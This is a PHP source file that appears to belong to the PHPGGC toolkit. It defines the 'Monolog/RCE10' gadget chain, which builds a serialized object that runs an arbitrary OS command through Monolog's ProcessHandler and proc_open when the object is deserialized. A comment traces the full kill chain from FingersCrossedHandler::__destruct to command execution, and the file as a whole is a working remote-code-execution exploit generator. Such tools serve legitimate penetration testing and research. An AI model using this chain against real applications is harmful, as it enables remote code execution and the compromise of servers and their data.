<?php

namespace GadgetChain\Monolog;

class RCE10 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '3.0.0 <= 3.10.0+';
    public static $vector = '__destruct';
    public static $author = '0xbro';
    public static $information = '
        This chain is a variation of Monolog/RCE5 and Monolog/RCE6. It uses a proc_open sink inside ProcessHandler, 
        which executes arbitrary commands serialized within the deserialized object .
        Kill chain: 
        FingersCrossedHandler::__destruct()   [Handler base]
        → close()
            → flushBuffer()
                passthruLevel = 500 (non-null) → filter runs
                buffer[0]["level"] = 500 >= 500 → record passes
                getHandler() → ProcessHandler (already HandlerInterface) returned directly
                ProcessHandler::handleBatch([$record])
                    → AbstractProcessingHandler::handle($record)
                        isHandling(): 500 >= 100 → true
                        getFormatter() → null → new LineFormatter()
                        LineFormatter::format($record)   ← DateTimeImmutable in record["datetime"]
                        ProcessHandler::write($record)
                        ensureProcessIsStarted()
                            is_resource(null) = false → startProcess()
                            proc_open($command, ...)    ← OS COMMAND EXECUTED
        ';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];
        
        return new 
        \Monolog\Handler\FingersCrossedHandler(
            new 
            \Monolog\Handler\ProcessHandler($command)
        );
    }
}
